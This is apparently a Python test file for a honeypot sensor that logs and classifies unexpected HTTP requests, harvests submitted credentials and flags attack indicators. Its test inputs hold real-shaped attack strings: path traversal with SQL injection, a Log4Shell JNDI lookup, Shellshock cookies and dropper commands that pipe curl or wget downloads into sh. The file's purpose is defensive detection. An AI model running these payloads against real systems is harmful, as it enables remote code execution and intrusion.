"""Capture fidelity: what the sensor records about a request it did not expect.

Requests are written as raw bytes over a socket, never through an HTTP client
library, because a client library normalises exactly the things an attack
depends on (percent-encoding, dot segments, header case and order).
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mirage_crawl import capture, credentials, eventlog  # noqa: E402
from mirage_crawl.config import Config  # noqa: E402
from mirage_crawl.server import build_app, start_sites  # noqa: E402

failures: list[str] = []

WALLET = (
    "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgz"
    "YnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD"
)


def check(name: str, condition: bool, detail: str = "") -> None:
    print(f"  {'PASS' if condition else 'FAIL'}  {name}" + (f"  ({detail})" if detail and not condition else ""))
    if not condition:
        failures.append(name)


def test_header_capture() -> None:
    print("\nheader capture (unit)")
    raw = [(b"Host", b"x"), (b"X-Forwarded-For", b"9.9.9.9"), (b"Cookie", b"sid=abc"),
           (b"X-Big", b"A" * 3000), (b"Authorization", b"Basic dTpw")]
    pairs, truncated = capture.header_pairs(raw, drop_first={"x-forwarded-for"})
    names = [n for n, _ in pairs]
    check("wire order kept, injected header dropped", names == ["Host", "Cookie", "X-Big", "Authorization"], str(names))
    check("each value capped at 1 KB", len(dict(pairs)["X-Big"]) == capture.HEADER_VALUE_CAP)
    check("capping a value marks truncation", truncated)
    check("credentials stored verbatim", dict(pairs)["Authorization"] == "Basic dTpw"
          and dict(pairs)["Cookie"] == "sid=abc")

    many = [(f"X-{i}".encode(), b"v" * 900) for i in range(20)]
    pairs, truncated = capture.header_pairs(many)
    total = sum(len(n) + len(v) for n, v in pairs)
    check("total capped at 8 KB", total <= capture.HEADERS_TOTAL_CAP and truncated, str(total))
    check("non-ascii bytes survive as latin-1",
          capture.header_pairs([(b"X", "é".encode("utf-8"))])[0][0][1] == "é".encode("utf-8").decode("latin-1"))

    check("raw path and query split", capture.split_raw("/a/%2e%2e/b?q=%27x") == ("/a/%2e%2e/b", "q=%27x"))
    check("no query gives None", capture.split_raw("/a") == ("/a", None))

    text = capture.body_fields(capture.Body(b"user=a&pass=b", False, 13), 4096)
    check("utf-8 body stored as text", text["body"] == "user=a&pass=b" and text["body_encoding"] == "utf-8")
    check("body hash is sha256 of captured bytes",
          text["body_sha256"] == hashlib.sha256(b"user=a&pass=b").hexdigest())
    binary = capture.body_fields(capture.Body(b"\xff\x00\x01", False, 3), 4096)
    check("binary body stored as base64", binary["body_encoding"] == "base64"
          and base64.b64decode(binary["body"]) == b"\xff\x00\x01")
    prefix = capture.body_fields(capture.Body(b"x" * 100, True, 5000), 10)
    check("logged prefix is bounded, hash is not", prefix["body"] == "x" * 10 and prefix["body_len"] == 100
          and prefix["body_truncated"] and prefix["content_length"] == 5000)


def test_scanner_false_positives() -> None:
    """Shapes from the first live day that the scanner mislabelled as payloads.

    Each one put a session into the `payload` stage without any payload, so
    the headline stage count was wrong. The true-positive twin of each case is
    checked next to it, so a fix cannot just switch the detector off.
    """
    print("\nscanner false positives seen live")

    def scan(path="/", query=None, headers=(), body=None):
        b = capture.Body(body.encode(), False, len(body)) if body else None
        return capture.scan_request(path, query, [list(h) for h in headers], b, "scannersnoop.com")

    found, _ = scan(headers=[("User-Agent", "curl/8.14.1")])
    check("curl/8.x user agent is not a downloader", not found.downloaders, str(found.downloaders))
    found, _ = scan(headers=[("User-Agent", "Wget/1.21.4")])
    check("Wget/1.x user agent is not a downloader", not found.downloaders, str(found.downloaders))
    found, _ = scan(headers=[("User-Agent", "() { :; }; /usr/bin/wget http://x.test/a")])
    check("a wget command inside a user agent still is", found.downloaders == ["wget"], str(found.downloaders))

    found, _ = scan(headers=[("Signature-Agent", '"https://bot.duckduckgo.com"')])
    check("Web Bot Auth Signature-Agent url is not a payload url", not found.urls, str(found.urls))

    found, _ = scan(path="http://api.ipify.org/")
    check("absolute-form proxy target is not a payload url", not found.urls, str(found.urls))
    found, _ = scan(path="api.ipify.org:443")
    check("CONNECT authority is not a payload url", not found.urls, str(found.urls))
    found, _ = scan(path="/shell", query="cd+/tmp;wget+http://x.test/a.sh;sh+a.sh")
    check("a url in a query is still a payload url", found.urls == ["http://x.test/a.sh"], str(found.urls))

    # RedTail's body: "(wget -qO- https://h/sh || curl -sk https://h/sh) | sh"
    found, _ = scan(body="(wget --no-check-certificate -qO- https://217.60.102.5/sh || "
                         "curl -sk https://217.60.102.5/sh) | sh -s apache")
    check("shell punctuation is not part of a url", found.urls == ["https://217.60.102.5/sh"], str(found.urls))
    # Jaws: the url ends where the shell command separator starts.
    found, _ = scan(path="/shell", query="cd+/tmp;wget+http://play.example.test/$file;chmod+777+$file")
    check("a ; ends the url", found.urls == ["http://play.example.test/$file"], str(found.urls))


def test_credentials() -> None:
    print("\ncredential extraction (unit)")

    def ex(headers=(), query=None, body=b"", ctype=None):
        hdrs = [list(h) for h in headers]
        if ctype:
            hdrs.append(["Content-Type", ctype])
        return [(c.scheme, c.source, c.user, c.password)
                for c in credentials.extract(hdrs, query, capture.Body(body, False, len(body)) if body else None)]

    check("basic auth decoded", ex([("Authorization", "Basic YWRtaW46aHVudGVyMg==")])
          == [("basic", "authorization", "admin", "hunter2")])
    check("basic password may contain colons",
          ex([("Authorization", "Basic " + base64.b64encode(b"u:a:b").decode())])[0][3] == "a:b")
    check("malformed basic kept raw", ex([("Authorization", "Basic !!!")]) == [("basic", "authorization", None, "!!!")])
    check("bearer token kept", ex([("Authorization", "Bearer sk-live-123")]) == [("bearer", "authorization", None, "sk-live-123")])
    check("api key header kept", ex([("X-Api-Key", "k123")]) == [("api_key", "header:X-Api-Key", None, "k123")])
    check("wordpress form", ex(body=b"log=admin&pwd=letmein&wp-submit=Log+In",
                                ctype="application/x-www-form-urlencoded") == [("form", "body", "admin", "letmein")])
    check("json login", ex(body=b'{"username":"root","password":"toor"}', ctype="application/json")
          == [("form", "json", "root", "toor")])
    check("query login", ex(query="user=a&pass=b") == [("form", "query", "a", "b")])
    check("username without a password is not a credential", ex(body=b"user=a&x=1", ctype="application/x-www-form-urlencoded") == [])
    check("no auth, no body, nothing", ex([("Host", "x")]) == [])


async def raw(target, payload: bytes) -> bytes:
    if isinstance(target, Path):
        reader, writer = await asyncio.open_unix_connection(str(target))
    else:
        reader, writer = await asyncio.open_connection("127.0.0.1", target)
    writer.write(payload)
    await writer.drain()
    data = await asyncio.wait_for(reader.read(), timeout=5)
    writer.close()
    return data


async def test_live() -> None:
    tmp = Path(tempfile.mkdtemp(prefix="mirage-capture-"))
    try:
        cfg = Config(
            host="127.0.0.1", port=0, origin="http://docs.test.invalid",
            log_dir=tmp / "events", secret_file=tmp / "secret",
            ranges_file=Path("config/crawler_ranges.json"), projects=4, pages_per_project=3,
            verify_identity=False, front_socket=tmp / "front.sock", admin_socket=None,
            body_bytes=1024, body_log_bytes=64,
        )
        app = build_app(cfg)
        runner = await start_sites(app, cfg)
        port = app["sensor"].public_address[1]

        await raw(port, b"GET /docs/%2e%2e/etc/passwd?id=1%27%20OR%201=1 HTTP/1.1\r\n"
                        b"Host: x\r\nCookie: sid=s3cr3t\r\nAuthorization: Basic YWRtaW46aHVudGVyMg==\r\n"
                        b"Connection: close\r\n\r\n")
        body = b"username=admin&password=letmein"
        await raw(port, b"POST /wp-login.php HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
                        b"Content-Type: application/x-www-form-urlencoded\r\n"
                        b"Content-Length: %d\r\n\r\n%s" % (len(body), body))
        big = b"B" * 3000
        await raw(port, b"PUT /upload HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
                        b"Content-Length: %d\r\n\r\n%s" % (len(big), big))
        ray = b'{"entrypoint":"curl http://45.9.148.99/x | sh"}'
        await raw(port, b"POST /api/jobs/ HTTP/1.1\r\nHost: x\r\nConnection: close\r\n"
                        b"Content-Length: %d\r\n\r\n%s" % (len(ray), ray))
        await raw(port, b"GET / HTTP/1.1\r\nHost: x\r\nUser-Agent: ${${lower:j}ndi:ldap://evil.test/a}\r\n"
                        b"Connection: close\r\n\r\n")
        await raw(port, b"GET /public/ HTTP/1.1\r\nHost: x\r\n"
                        b"User-Agent: Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)\r\n"
                        b"Referer: http://docs.test.invalid/docs/\r\nConnection: close\r\n\r\n")
        await raw(port, b"GET /docs/?w=" + WALLET.encode() + b" HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
        await raw(port, b"GET /cgi-bin/status HTTP/1.1\r\nHost: x\r\n"
                        b"Cookie: () { :; }; /bin/bash -c 'curl http://198.51.100.7/s | sh'\r\nConnection: close\r\n\r\n")
        await raw(port, b"GET /api/tags HTTP/1.1\r\nHost: x\r\nAuthorization: Basic b2xsYW1hOm9sbGFtYQ==\r\n"
                        b"Connection: close\r\n\r\n")
        await raw(cfg.front_socket, b"GET /x HTTP/1.1\r\nX-Forwarded-For: 5.5.5.5\r\n"
                                    b"X-Mirage-JA4: t13_x_y\r\nHost: x\r\nConnection: close\r\n\r\n")

        await runner.cleanup()
        events = list(eventlog.read_events(cfg.log_dir))
        reqs = {e["raw_path"]: e for e in events if e["kind"] == eventlog.EVENT_REQUEST}

        print("\nrequest record (live)")
        trav = reqs.get("/docs/%2e%2e/etc/passwd")
        check("raw path keeps the attacker's encoding", trav is not None, str(list(reqs)))
        if trav:
            check("raw query keeps the attacker's encoding", trav["raw_query"] == "id=1%27%20OR%201=1")
            check("all headers logged in wire order",
                  [n for n, _ in trav["headers"]] == ["Host", "Cookie", "Authorization", "Connection"],
                  str(trav["headers"]))
            check("cookie and authorization verbatim",
                  ["Cookie", "sid=s3cr3t"] in trav["headers"]
                  and ["Authorization", "Basic YWRtaW46aHVudGVyMg=="] in trav["headers"])
            check("no body fields on a bodiless GET", "body_sha256" not in trav)
            check("every event carries a request id", bool(trav.get("rid")))

        print("\nbody capture (live)")
        login = reqs.get("/wp-login.php")
        check("body captured on an unrouted POST", bool(login) and login.get("body") == body.decode())
        check("body hash logged", bool(login) and login["body_sha256"] == hashlib.sha256(body).hexdigest())
        upload = reqs.get("/upload")
        check("capture stops at CRAWL_BODY_BYTES", bool(upload) and upload["body_len"] == 1024
              and upload["body_truncated"] and upload["content_length"] == 3000, str(upload and {
                  k: upload.get(k) for k in ("body_len", "body_truncated", "content_length")}))
        check("event prefix stops at CRAWL_BODY_LOG_BYTES", bool(upload) and len(upload["body"]) == 64)

        hunts = [e for e in events if e["kind"] == eventlog.EVENT_HUNT]
        check("hunt handler sees the body the middleware read",
              bool(hunts) and hunts[0]["body_sha256"] == hashlib.sha256(ray).hexdigest(), str(hunts[:1]))
        check("hunt and request events share a request id",
              bool(hunts) and hunts[0]["rid"] == reqs["/api/jobs/"]["rid"])

        print("\nscan every request (live)")
        log4j = reqs.get("/")
        found = (log4j or {}).get("indicators") or {}
        check("log4shell in a User-Agent on / is found", found.get("jndi") == ["${jndi:ldap://evil.test/a}"], str(found))
        check("indicator location recorded", "header:User-Agent" in (log4j or {}).get("indicator_locations", []),
              str((log4j or {}).get("indicator_locations")))
        crawler = reqs.get("/public/")
        check("crawler UA info URL and own-site Referer are not indicators",
              bool(crawler) and crawler.get("indicators") is None, str(crawler and crawler.get("indicators")))
        wallet = reqs.get("/docs/")
        check("wallet in a query on an ordinary page is found",
              bool(wallet) and (wallet.get("indicators") or {}).get("wallets", {}).get("monero") == [WALLET])
        shock = reqs.get("/cgi-bin/status")
        shock_found = (shock or {}).get("indicators") or {}
        check("shellshock in a Cookie is found", shock_found.get("shellshock") is True, str(shock_found))
        check("URL inside a header payload is kept", any("198.51.100.7" in u for u in shock_found.get("urls", [])))

        from mirage_crawl.classify import build_profiles
        profiles = build_profiles(cfg.log_dir)
        holders = [p for p in profiles.values() if p.wallets.get("monero")]
        check("profile collects wallets from any request", bool(holders))
        check("profile records exploit markers",
              any("log4shell" in p.exploits for p in profiles.values())
              and any("shellshock" in p.exploits for p in profiles.values()))

        print("\ncredential events (live)")
        creds = [e for e in events if e["kind"] == eventlog.EVENT_CREDENTIAL]
        wp = [c for c in creds if c["path"] == "/wp-login.php"]
        check("login form POST produces a credential event",
              bool(wp) and (wp[0]["user"], wp[0]["password"]) == ("admin", "letmein"), str(wp))
        check("credential event joins its request", bool(wp) and wp[0]["rid"] == reqs["/wp-login.php"]["rid"])
        ollama = [c for c in creds if c["path"] == "/api/tags"]
        check("basic auth on a hunt route records the persona",
              bool(ollama) and ollama[0]["persona"] == "ollama" and ollama[0]["user"] == "ollama", str(ollama))
        check("site routes record the site persona", bool(wp) and wp[0]["persona"] == "site")
        check("basic auth on any route is captured", any(c["user"] == "admin" and c["password"] == "hunter2" for c in creds))

        front = reqs.get("/x")
        check("front's injected headers are not in the logged header list",
              bool(front) and [n for n, _ in front["headers"]] == ["Host", "Connection"], str(front and front["headers"]))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    test_header_capture()
    test_scanner_false_positives()
    test_credentials()
    asyncio.run(test_live())
    print("\nFAILURES: " + ", ".join(failures) if failures else "\nall capture checks passed")
    sys.exit(1 if failures else 0)
